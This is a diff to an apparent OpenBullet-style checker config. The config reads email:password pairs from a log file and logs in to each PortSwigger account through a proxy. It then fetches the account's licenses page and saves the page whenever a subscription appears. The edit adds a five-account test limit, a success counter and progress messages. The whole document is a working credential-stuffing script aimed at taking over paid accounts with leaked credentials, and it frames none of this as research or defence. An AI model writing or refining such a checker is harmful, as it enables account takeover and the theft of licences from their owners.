@@ -5,23 +5,30 @@ FileReadLines "Configs\log.txt" -> VAR "accounts"
 PRINT "Loaded accounts" White
 
 SET VAR "counter" "0" Integer
+SET VAR "success_count" "0" Integer
 
-## Loop through each account
+## Loop through each account - test first 5 accounts
 FOREACH $"<accounts>" -> VAR "account"
 
   SUM $"<counter>" 1 -> VAR "counter"
+
+  IF $"<counter>" GreaterThan "5"
+    BREAK
+  ENDIF
 
   Split $"<account>" ":" -> VAR "creds"
   SET VAR "email" $"<creds[0]>"
   SET VAR "password" $"<creds[1]>"
 
-  PRINT "[$"<counter>"] $"<email>"..." White
+  PRINT "[$"<counter>"] Processing $"<email>"" White
 
   ## Step 1: GET login page
   HttpRequest GET "https://login.portswigger.net/u/login" AutoRedirect=True ReadResponseSource=True AppendResponseCookies=True
     TIMEOUT 30000
     PROXY Default
     -> VAR "loginPageRes"
+
+  PRINT "  Step 1: Login page fetched" Gray
 
   ## Step 2: POST credentials
   ConstantString "username=$"<email>"&password=$"<password>"&action=default" -> VAR "postData"
@@ -34,25 +41,28 @@ FOREACH $"<accounts>" -> VAR "account"
     PROXY Default
     -> VAR "loginRes"
 
+  PRINT "  Step 2: Login POST completed" Gray
+
   ## Step 3: GET licenses page
   HttpRequest GET "https://portswigger.net/users/youraccount/licenses" AutoRedirect=True ReadResponseSource=True AppendResponseCookies=True
     TIMEOUT 30000
     PROXY Default
     -> VAR "licensesRes"
 
+  PRINT "  Step 3: Licenses page fetched" Gray
+
   ## Check if successful
   IF $"<licensesRes>" Contains "subscription"
-    PRINT "✓ Success" Green
+    PRINT "  ✓ Success - subscription found" Green
 
     ## Save HTML file
     ConstantString "Configs\extraction_results\$"<email>"_licenses.html" -> VAR "htmlFile"
     StringToBytes $"<licensesRes>" -> VAR "htmlBytes"
     FileWriteBytes $"<htmlFile>" $"<htmlBytes>"
 
-    SET VAR "success" "true"
+    SUM $"<success_count>" 1 -> VAR "success_count"
   ELSE
-    PRINT "✗ Failed" Red
-    SET VAR "success" "false"
+    PRINT "  ✗ Failed - no subscription keyword" Red
   ENDIF
 
   ## Delay between requests
@@ -60,5 +70,6 @@ FOREACH $"<accounts>" -> VAR "account"
 
 ENDFOREACH
 
-PRINT "✓ Extraction completed" Green
-PRINT "Results saved to: Configs\extraction_results\" Green
+PRINT "" White
+PRINT "Test extraction completed" Green
+PRINT "Successfully extracted: $"<success_count>" files" Green
